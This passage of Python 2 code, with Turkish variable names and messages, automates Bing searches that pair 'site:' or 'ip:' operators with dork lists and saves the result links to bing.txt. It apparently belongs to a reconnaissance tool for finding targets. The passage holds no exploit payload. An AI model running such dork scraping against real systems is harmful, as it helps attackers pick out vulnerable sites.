					dex= soup.find_all('h2')
			
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							p= ij.get('href')
							print p
							bingcom=open("bing.txt","a")
							bingcom.write(p+"\n")
							bingcom.close()
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			dorkli=open(dorklistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in dorkli:
				drk=i.replace("\n","")
				print renkler.kirmizi+"%s dorku icin %s. sayfa okunuyor veriler cekiliyor."%(drk,sayfa)+renkler.beyaz
				
				sit="site:"+site+"+"+drk
				for ig in range (sayfa):
					try:
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
						time.sleep(zaman)
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
							print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			
			dorkli=open(dorklistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in dorkli:
				drk=i.replace("\n","")
				print renkler.kirmizi+"%s dorku icin %s sayfa cekiliyor."%(drk,sayfa)+renkler.beyaz
				
				sit="site:"+site+"+"+drk
				for ig in range (sayfa):
					try:
						syfa=ig*10+1
						pere=ig+1
						time.sleep(zaman)
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
					except :
						continue


			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if sitelistesi !=None and dork !=None:
		if sayfa ==1:
			sitelist=open(sitelistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				time.sleep(zaman)
				
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
				
				sit="site:"+siteli+"+"+dork
				print sit
				url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
				headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
				rq=requests.session()
				rq.headers.update(headers)
				res=rq.get(url)
				rm=res.content
				soup = BeautifulSoup(rm,'html.parser')
				dex= soup.find_all('h2')
			
				for ia in dex:
					l=ia.find_all('a')
					sokup=BeautifulSoup(str(l),"html.parser")
					for ij in sokup.find_all("a"):
						 p= ij.get('href')
						 print p
						 bingcom=open("bing.txt","a")
						 bingcom.write(p+"\n")
						 bingcom.close()
				bitis= datetime.datetime.now()
				gecen(baslangic,bitis)
				dduz()
				print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			sitelist=open(sitelistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
				
				sit="site:"+siteli+"+"+dork
				for ig in range (sayfa):
					try:
						time.sleep(zaman)
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						print url
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			sitelist=open(sitelistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				sit="site:"+siteli+"+"+dork
				for ig in range (sayfa):
					try:
						syfa=ig * 10+ 1
						pere=ig+1
						time.sleep(zaman)
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if sitelistesi !=None and dorklistesi!=None:
		if sayfa == 1:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(sitelistesi,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					time.sleep(zaman)
					drk=j.replace("\n","")
					sit="site:"+sitel+"+"+drk
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
					url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content

					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(sitelistesi,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					time.sleep(zaman)
					drk=j.replace("\n","")
					sit="site:"+sitel+"+"+drk
					for sy in range(sayfa):
						try:
							syfa=sy*10+1
							print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
							url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE"%(sit,sit,syfa)
							headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
							rq=requests.session()
							rq.headers.update(headers)
							res=rq.get(url)
							rm=res.content
							soup = BeautifulSoup(rm,'html.parser')
							dex= soup.find_all('h2')
							for ia in dex:
								l=ia.find_all('a')
								sokup=BeautifulSoup(str(l),"html.parser")
								for ij in sokup.find_all("a"):
									 p= ij.get('href')
									 print p
									 bingcom=open("bing.txt","a")
									 bingcom.write(p+"\n")
									 bingcom.close()
						except requests.exceptions.ConnectionError:
							print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
							continue
						except requests.exceptions.Timeout:
								print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
								continue
						except requests.exceptions.TooManyRedirects:
								print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
								continue
						except urllib2.URLError:
							print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
							continue
						except urllib2.HTTPError:
							print renkler.kirmizi+"baglanmadi"+renkler.beyaz
							continue
						except socket.error:
							print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
							continue
						except httplib.BadStatusLine:
							print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
							continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(sitelistesi,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				print renkler.kirmizi+"Cekilen url = %s"%(sitel)+renkler.beyaz
				for j in dorkli:
					print renkler.kirmizi+"Cekilen url = %s"%(sitel)+renkler.beyaz
					drk=j.replace("\n","")
					print renkler.kirmizi+"%s dorku icin ilk  %s sayfa cekiliyor."%(drk,sayfa)+renkler.beyaz
					sit="site:"+sitel+"+"+drk
					for sy in range(sayfa):
						try:
							time.sleep(zaman)
							syfa=sy*10+1
							pere=sy+1
							print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sy)+renkler.beyaz
							url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s"%(sit,sit,syfa,pere)
							headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
							rq=requests.session()
							rq.headers.update(headers)
							res=rq.get(url)
							rm=res.content
							#print rm
							soup = BeautifulSoup(rm,'html.parser')
							dex= soup.find_all('h2')
							for ia in dex:
								l=ia.find_all('a')
								sokup=BeautifulSoup(str(l),"html.parser")
								for ij in sokup.find_all("a"):
									 p= ij.get('href')
									 print p
									 bingcom=open("bing.txt","a")
									 bingcom.write(p+"\n")
									 bingcom.close()
						
						except requests.exceptions.ConnectionError:
							print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
							continue
						except requests.exceptions.Timeout:
							print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except requests.exceptions.TooManyRedirects:
							print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except urllib2.URLError:
							print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
							continue
						except urllib2.HTTPError:
							print renkler.kirmizi+"baglanmadi"+renkler.beyaz
							continue
						except socket.error:
							print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
							continue
						except httplib.BadStatusLine:
							print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
							continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if iparama !=None and site ==None and sitelistesi==None and uzantilar==None and dork==None and dorklistesi==None:
		if sayfa==1:
			time.sleep(zaman)
			baslangic= datetime.datetime.now()
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			sit="ip:"+iparama
			url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
			headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
			rq=requests.session()
			rq.headers.update(headers)
			res=rq.get(url)
			rm=res.content
			soup = BeautifulSoup(rm,'html.parser')
			dex= soup.find_all('h2')
	
			for i in dex:
				l=i.find_all('a')
				sokup=BeautifulSoup(str(l),"html.parser")
				for ij in sokup.find_all("a"):
					 p= ij.get('href')
					 print p
					 bingcom=open("bing.txt","a")
					 bingcom.write(p+"\n")
					 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="ip:"+iparama
			for i in range (sayfa):
				try:
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
			kaynak=[]
			karsilastirma=[]
			sonduzen=[]
		if sayfa >=3:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="ip:"+iparama
			for i in range (sayfa):
				try:
					time.sleep(zaman)
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if iparama !=None and dork!=None and dorklistesi==None and iplistesi==None:
		if sayfa ==1:
			time.sleep(zaman)
			baslangic= datetime.datetime.now()
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			sit="ip:"+iparama+"+"+dork
			url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
			headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
			rq=requests.session()
			rq.headers.update(headers)
			res=rq.get(url)
			rm=res.content
			soup = BeautifulSoup(rm,'html.parser')
			dex= soup.find_all('h2')
			
			for i in dex:
				l=i.find_all('a')
				sokup=BeautifulSoup(str(l),"html.parser")
				for ij in sokup.find_all("a"):
					 p= ij.get('href')
					 print p
					 bingcom=open("bing.txt","a")
					 bingcom.write(p+"\n")
					 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="ip:"+iparama+"+"+dork
			for i in range (sayfa):
				try:
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
			kaynak=[]
			karsilastirma=[]
			sonduzen=[]
		if sayfa >=3:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="ip:"+iparama+"+"+dork
			for i in range (sayfa):
				try:
					syfa=i*10+1
					time.sleep(zaman)
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
			kaynak=[]
			karsilastirma=[]
			sonduzen=[]
	if iparama !=None and dorklistesi!=None:
		if sayfa==1:
			dorkli=open(dorklistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in dorkli:
				drk=i.replace("\n","")
				print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
				
				sit="ip:"+iparama+"+"+drk
